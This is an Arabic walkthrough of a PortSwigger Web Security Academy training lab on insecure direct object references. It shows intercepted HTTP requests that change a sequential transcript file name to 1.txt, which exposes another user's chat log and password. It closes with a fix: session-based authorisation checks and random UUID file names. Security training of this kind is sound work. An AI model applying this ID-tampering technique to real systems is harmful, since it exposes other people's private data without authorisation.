# [Insecure direct object references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)

## **`الهدف`**
العثور على كلمة مرور حساب `carlos` والدخول إليه.
## **`خطوات الحل`**
عند الذهاب إلى الـ `Live chat `والضغط على `View transcript` نلاحظ أن هناك تحميل ملف حدث باسم `2.txt` وبتكرار الضغط نجد أن الملفات بأعداد متوالية `(3.txt ثم 4.txt ثم 5.tx ...الخ `) ولكن لماذا بدأ العدد من `2` وليس من `1` لذلك كل ماعلينا فعله هو القيام بالضغط على `View transcript` ولكن باعتراض الـ `response` هذه المرة.
```http
HTTP/2 302 Found
Location: /download-transcript/3.txt
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
ونعدل اسم الملف إلى `1.txt`
```http
HTTP/2 302 Found
Location: /download-transcript/1.txt
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

لنجد النص التالي به.
```text
CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is 5ow20sgnu0sfkida5o2e. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

فنقوم بنسخ الباسورد والدخول إلى حساب `carlos` لننتهي من حل اللاب.

**==`ملاحظة:`**== بدلًا من اعتراض الـ `response` يُمكن أن نعترض الـ `request` الثالث الذي يحدث تلقائيًا بعد الضغط على `View transcript` ونُعدل اسم الملف إلى `1.txt`
```http
GET /download-transcript/1.txt HTTP/2
Host: 0aee008b035d509c81fc3e1000250016.web-security-academy.net
Cookie: session=kdwbYKBgqhsufT9R2EEH6Y89FMfaNz7T
```
## **`ترقيع الثغرة`**
يجب على السيرفر قبل أن يسمح بتحميل أى ملف `transcript` أن يتحقق من هوية المُستخدم الحالي `Session`، وهل هذا المُستخدم هو بالفعل أحد أطراف هذه المحادثة؟ إذا لم يكن كذلك، يتم رفض الطلب فوراً وإرجاع خطأ (مثل `403 Forbidden`).

ويجب استبدال الأرقام المتتالية بمُعرفات فريدة عشوائية `UUID / GUID`، فيصبح اسم الملف مثلاً: `d3b07384-d113-4956-a5d2-482d1a31be74.txt`.
وبهذه الطريقة، حتى لو كان التحكم في الوصول ضعيفاً، فمن المستحيل عملياً على المُهاجم تخمين اسم ملف محادثة شخص آخر.
